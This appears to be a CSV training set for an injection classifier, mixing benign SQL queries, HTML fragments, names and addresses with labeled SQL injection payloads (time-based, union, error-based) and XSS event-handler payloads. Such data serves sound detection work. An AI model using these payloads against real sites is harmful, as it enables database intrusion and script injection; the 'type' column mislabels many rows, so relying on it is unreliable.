Text,Label,type
1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,sql
<kbd onpointermove=alert(1)>XSS</kbd>,2,xss
"-3205""  )   union all select 5233,5233,5233,5233#",1,sql
<canvas onpointerout=alert(1)>XSS</canvas>,2,xss
SELECT entire,0,sql
"1%""  )   and 8715  =  5529",1,sql
"1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,1,sql
"<li><a href=""/wiki/Knowledge_representation_and_reasoning"" title=""Knowledge representation and reasoning"">Knowledge representation and reasoning </a> </li>",0,xss
SELECT * FROM yet WHERE point NOT LIKE 'breeze%',0,sql
"1""   )    )    as qhnb where 8302  =  8302 and   (  3020  =  3020  )  *6703--",1,xss
alcoleja,0,sql
"<h2>First steps<a class=""headerlink"" href=""#first-steps"" title=""Permalink to this headline"">¶</a></h2>",0,xss
"1%'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  '%'  =  '",1,sql
"-4477'   )    )    union all select 8444,8444,8444,8444,8444,8444,8444,8444--",1,sql
"av. vicente mortes, 78, 8?f",0,sql
SELECT tool FROM coffee,0,xss
91328189l,0,sql
SELECT * FROM art  WHERE best = breathe,0,sql
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c9a3c611fd' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,sql
SELECT AVG ( our ) FROM wise SELECT SUM ( outer ) ,0,sql
"		<div class=""body"">",0,xss
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # dwxl",1,sql
37428,0,sql
DELETE FROM sure WHERE naturally = 'buy',0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
SELECT AVG ( movie )  FROM whose  SELECT SUM ( rain ) ,0,xss
"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'vmuj' like 'vmuj",1,sql
-3666'  )   where 6386  =  6386 union all select 6386--,1,xss
SELECT * FROM wife WHERE split IN  ( SELECT rise FROM good ) ,0,sql
"1%"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,sql
c/ comercio 51,0,sql
"<img onmouseenter=""alert(1)"">test</img>",2,xss
9.45715E+15,0,xss
"SELECT DATE_ADD ( ""2017-06-15 09:34:21"", INTERVAL -3 HOUR ) ;",0,sql
"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""lxue"" like ""lxue",1,sql
34239,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation conference"">Bertini, M; Del Bimbo, A; Torniai, C (2006). ""Automatic annotation and semantic retrieval of video sequences using multimedia ontologies"". <i>MM '06 Proceedings of the 14th ACM international conference on Multimedia </i>. 14th ACM international conference on Multimedia. Santa Barbara: ACM. pp.&#160;679–682. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=conference&amp;rft.atitle=Automatic+annotation+and+semantic+retrieval+of+video+sequences+using+multimedia+ontologies&amp;rft.btitle=MM+%2706+Proceedings+of+the+14th+ACM+international+conference+on+Multimedia&amp;rft.place=Santa+Barbara&amp;rft.pages=679-682&amp;rft.pub=ACM&amp;rft.date=2006&amp;rft.aulast=Bertini&amp;rft.aufirst=M&amp;rft.au=Del+Bimbo%2C+A&amp;rft.au=Torniai%2C+C&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
19338,0,sql
"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",1,sql
luna,0,xss
SELECT TOP 3 * FROM fruit WHERE met = 'religious' SELECT * FROM addition,0,sql
"1%'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><button id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></button>",2,xss
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""eakt"" like ""eakt",1,sql
9362,0,xss
SELECT told FROM music,0,sql
"calle del mistral, 65",0,sql
<article id=x tabindex=1 onbeforeactivate=alert(1)></article>,2,xss
5.25793E+15,0,sql
" SELECT * FROM folks ORDER BY prize, clothing",0,sql
"1"" where 4064  =  4064 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,xss
 </li>,0,xss
"1   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  8671  =  8671",1,xss
"<li><cite id=""CITEREFGladwell2005"" class=""citation book""><a href=""/wiki/Malcolm_Gladwell"" title=""Malcolm Gladwell"">Gladwell, Malcolm </a> (2005). <a href=""/wiki/Blink_(book)"" class=""mw-redirect"" title=""Blink (book)""><i>Blink </i> </a>. New York: Little, Brown and Co. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-316-17232-5"" title=""Special:BookSources/978-0-316-17232-5""><bdi>978-0-316-17232-5 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Blink&amp;rft.place=New+York&amp;rft.pub=Little%2C+Brown+and+Co.&amp;rft.date=2005&amp;rft.isbn=978-0-316-17232-5&amp;rft.aulast=Gladwell&amp;rft.aufirst=Malcolm&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
	 </span> 2018 ,0,xss
vilamasa pacheca,0,sql
&#x3C,2,xss
SELECT * FROM brother WHERE dirty = 'apple' LIMIT 3,0,sql
sahid,0,sql
"<li><a href=""/wiki/Ranulph_Glanville"" title=""Ranulph Glanville"">Ranulph Glanville </a> </li>",0,xss
<mark onblur=alert(1) tabindex=1 id=x></mark><input autofocus>,2,xss
"  SELECT * FROM cat WHERE member IN  ( 'sum', 'harbor', 'edge' )  ",0,xss
blanquer,0,sql
hinson,0,xss
"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",1,sql
"1   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   8024  =  8024",1,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/jobs.html"">Jobs: pausing and resuming crawls</a></li>",0,xss
"<style>@keyframes slidein {}</style><form style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></form>",2,xss
DELETE FROM possible WHERE kitchen = 'largest',0,sql
"1"" where 6352  =  6352",1,sql
"<xmp oncut=""alert(1)"" contenteditable>test</xmp>",2,xss
"<li>Report bugs with Scrapy in our <a class=""reference external"" href=""https://github.com/scrapy/scrapy/issues"">issue tracker</a>.</li>",0,xss
"1'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"<li><a href=""/wiki/Integrated_circuit"" title=""Integrated circuit"">Integrated circuit </a> </li>",0,xss
<tr onpointerleave=alert(1)>XSS</tr>,2,xss
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;240–310, </li>",0,xss
adlard@muebemiweb.ke,0,sql
"1'+  (  select papc where 8900  =  8900 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
SELECT * FROM Customers  WHERE City = 'Berlin'  OR City = 'München';,0,sql
"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ksxz""  =  ""ksxz",1,sql
select   (  case when   (  6839  =  2730  )   then 6839 else 6839*  (  select 6839 from mysql.db  )   end  )  #,1,sql
SELECT * FROM wp_posts WHERE ID  =  239189 LIMIT 1,0,xss
SELECT rock ( s )  FROM addition SELECT gravity ( s ) ,0,sql
1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   '%'  =  ',1,xss
SELECT * FROM them ORDER BY anyway DESC,0,sql
doriot,0,sql
"<li><a href=""/wiki/Laws_of_robotics"" title=""Laws of robotics"">Laws </a> </li>",0,xss
"1%""   )    )    union all select null,null,null,null,null,null,null--",1,sql
kresl,0,xss
"	 <div id=""Note:_This_template_roughly_follows_the_2012_ACM_Computing_Classification_System."">Note: This template roughly follows the 2012 <a href=""/wiki/ACM_Computing_Classification_System"" title=""ACM Computing Classification System"">ACM Computing Classification System </a>. </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Computer_hardware"" title=""Computer hardware"">Hardware </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
SELECT * FROM weather WHERE NOT stay = 'just'  AND NOT concerned = 'respect',0,sql
SELECT COUNT ( wonder ) FROM use,0,sql
 </li>,0,xss
<optgroup onpointerover=alert(1)>XSS</optgroup>,2,xss
blotta azagra,0,sql
urrutia delems,0,sql
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'iaud'  =  'iaud",1,sql
"1'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
rothamel,0,sql
jabbari,0,sql
"  SELECT todayID AS ID, world AS scale FROM favorite",0,sql
"1%""   )    )     )   waitfor delay '0:0:5'--",1,xss
"<li><a href=""/wiki/Radio-frequency_identification"" title=""Radio-frequency identification"">RFID </a>",0,xss
committe,0,sql
; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,1,xss
SELECT LOG2 ( 6 ) ;,0,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/downloader-middleware.html"">Downloader Middleware</a></li>",0,xss
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,sql
"<h1 onclick=""alert(1)"">test</h1>",2,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=25"" title=""Edit section: Integrating the approaches"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
SELECT * FROM running WHERE    NOT rocky = 'involved',0,sql
	 </span>,0,xss
 </li>,0,xss
"1'   )    )    as xjen where 6791  =  6791 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"1'  )   and elt  (  3528  =  3566,3566  )  ",1,sql
SELECT * FROM mountain WHERE consist BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
SELECT COUNT ( mind ) FROM dog,0,sql
"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'ngwt'  =  'ngwt",1,xss
SELECT vowel ( s ) FROM burn INNER JOIN,0,sql
	 </span> </h3>,0,xss
"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",1,sql
"<li id=""cite_note-55""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-55"">^ </a> </b> ",0,xss
SELECT * FROM whatever WHERE health NOT BETWEEN 'into' AND 'managed',0,sql
SELECT * FROM  ( SELECT dance FROM grain ) ,0,sql
SELECT TOP 3 * FROM musical,0,sql
1   )    )     ) ,1,xss
dagma,0,sql
"1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # utdm",1,sql
	 </span> </li>,0,xss
	 </span>,0,xss
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a> </li>",0,xss
45025499d,0,sql
"<nobr onmouseover=""alert(1)"">test</nobr>",2,xss
" select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",1,xss
"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionend=alert(1)></embed>",2,xss
"1'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
<sub id=x tabindex=1 onfocus=alert(1)></sub>,2,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 55203 )  ORDER BY meta_id ASC",0,xss
pe7tr0b9,0,xss
"-8344 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wjpa",1,sql
"   SELECT COUNT ( answer ) , stared FROM anywhere BY lady",0,xss
waitfor delay '0:0:5' and 'gsvt'  =  'gsvt,1,sql
SELECT * FROM foot FETCH FIRST 3 ROWS ONLY,0,sql
SELECT * FROM offer FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM dawn,0,sql
FROM  ( SELECT DISTINCT owner FROM ball ) ,0,sql
"	 </span> <span class=""reference-text"">",0,xss
DELETE FROM weight,0,sql
"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",2,xss
" select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1,sql
1   )    )    as prxq where 4600  =  4600,1,sql
SELECT author ( s )  FROM section SELECT try ( s ) ,0,sql
SELECT MIN ( compound )  AS underline FROM crowd,0,sql
SELECT MIN ( keep )  AS thy FROM zulu,0,sql
"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx",1,sql
select   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  select 4996 from master..sysdatabases  )   end  )  --,1,sql
SELECT * FROM previous WHERE six = 'got' FETCH FIRST 3 ROWS ONLY,0,sql
1'||  (  select 'lxyu' from dual where 5789  =  5789 union all select null#,1,sql
cha$9i74r0,0,sql
7.35961E+15,0,sql
"<style>:target {transform: rotate(180deg);}</style><button id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></button>",2,xss
<spacer onpointerleave=alert(1)>XSS</spacer>,2,xss
bernadet,0,sql
select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa,1,sql
<kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>,2,xss
SELECT AVG ( line ) FROM equipment,0,sql
"<bgsound onkeydown=""alert(1)"" contenteditable>test</bgsound>",2,xss
chopel@restauranteslaespadaa.bg,0,sql
"-1218' union all select 2663,2663,2663,2663--",1,sql
-4617'   )    )     )   or 9323  =  9323#,1,sql
	 </span>,0,xss
"1""  )   where 9295  =  9295 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,xss
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",1,sql
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'knbx' like 'knbx",1,xss
"<content onclick=""alert(1)"">test</content>",2,xss
"  SELECT gold,men FROM quite WHERE learn = 'say' UNION SELECT personal, rear FROM damage",0,sql
"<datalist onbeforepaste=""alert(1)"" contenteditable>test</datalist>",2,xss
	 </span> </small> ,0,xss
"<em draggable=""true"" ondragleave=""alert(1)"">test</em>",2,xss
"1""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""jmjr"" like ""jmjr",1,xss
<select onpointerout=alert(1)>XSS</select>,2,xss
8e6a74aer,0,xss
velen,0,sql
"  SELECT WEEK ( ""2017-10-25"" ) ;",0,xss
aminda,0,sql
<data id=x tabindex=1 onfocus=alert(1)></data>,2,xss
"select * from generate_series  (  7762,7762,case when   (  7762  =  1293  )   then 1 else 0 end  )   limit 1--",1,xss
SELECT * FROM cost 3 SELECT * FROM nor,0,sql
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Glossaries_of_science_and_engineering"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0,xss
SELECT * FROM general WHERE four = 'explanation',0,xss
"-7889""   )    )    as oayf where 1765  =  1765 or 8571  =  8571--",1,sql
SELECT * FROM monkey WHERE basket = 'corn' LIMIT 3,0,sql
SELECT * FROM ice WHERE week = 'which'  AND City = 'arm',0,sql
"-7559"" or 8792  =  6905--",1,sql
"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",1,xss
	 </span>,0,xss
<main onpointerover=alert(1)>XSS</main>,2,xss
SELECT * FROM fill ORDER BY title,0,sql
SELECT COUNT ( told ) FROM slowly,0,sql
SELECT * FROM beat,0,xss
"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1,sql
norring-fujikawa@autoconstruccion.au,0,xss
"select * from generate_series  (  6468,6468,case when   (  6468  =  7999  )   then 1 else 0 end  )   limit 1--",1,xss
